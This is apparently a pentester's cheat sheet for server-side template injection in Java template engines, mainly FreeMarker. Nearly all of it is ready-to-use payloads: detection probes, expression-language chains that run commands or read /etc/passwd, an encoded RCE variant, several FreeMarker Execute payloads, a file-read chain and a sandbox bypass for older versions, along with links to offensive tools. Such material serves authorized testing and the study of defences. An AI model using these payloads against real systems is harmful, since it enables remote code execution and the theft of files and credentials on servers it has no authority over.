
# Common injections

**Proof of concept**
```java
${7*7}
${{7*7}}
#{7*7} 
*{7*7}
@{7*7}
~{7*7}
```

**Utils**
```java
// ?
class.getClassLoader()
// Get pwd
class.getResource("").getPath() 
// Get file content
class.getResource("../../../../../index.htm").getContent() 
// List environement variables
T(java.lang.System).getenv()
// RCE
T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')
// RCE with decimal encoding : following command is `id`
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

# FreeMarker

> FreeMarker is one of the most popular Java template languages, and the language I've seen exposed to users most frequently.


> [!NOTE] HTTP Header
> FreeMarker can send an `X-Powered-By:FREEMARKER` HTTP header, this can help during detection

**Detect**
```java
{{7*7}}   // Should return {{7*7}}
${7*7}    // Should return 49
#{{7*7}}  // Should return 49
${7*'7'}  // Should return nothing or an error
${foobar} // Should return nothing
```

**Utils**
```java
// RCE
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
// RCE 2
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
// RCE 3
${"freemarker.template.utility.Execute"?new()("id")}
// File read
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('./').toURL().openStream().readAllBytes()?join(" ")}
```

**Sandbox bypass**
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

> [!NOTE] FreeMarker SandBox Bypass
> Works only on FreeMarker versions released before the 2.3.30


# Tools

- https://github.com/vladko312/SSTImap
- [https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)

# Resources

- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md